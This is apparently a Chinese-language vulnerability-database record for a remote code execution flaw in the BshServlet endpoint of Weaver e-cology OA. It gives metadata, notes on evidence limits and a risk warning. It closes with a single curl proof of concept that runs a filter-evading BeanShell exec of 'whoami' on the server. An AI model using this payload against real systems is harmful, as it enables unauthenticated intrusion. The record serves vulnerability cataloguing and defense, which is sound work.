---
source: "hatch 补库批 20260928"
title: "泛微e-cology BshServlet 远程代码执行"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本信息"
prerequisites: "无凭证curl，未明确认证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FRCE%E6%BC%8F%E6%B4%9E.md"
id: "vw-126b322b69d7c074bf6f7114"
entity_id: "ve-126b322b69d7c074bf6f7114"
schema_version: "1"
---

# 泛微e-cology BshServlet 远程代码执行

## 条目说明

- 对象与具体问题：泛微e-cology；BshServlet RCE
- 版本、配置及部署条件：无版本信息
- 认证与权限前提：无凭证curl，未明确认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 单行curl与BshServlet既有报告同payload，无新增证据
- 简介影响空白、无响应/来源，泛化标题不利检索

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    curl http://0-sec.org:8000/weaver/bsh.servlet.BshServlet -d 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
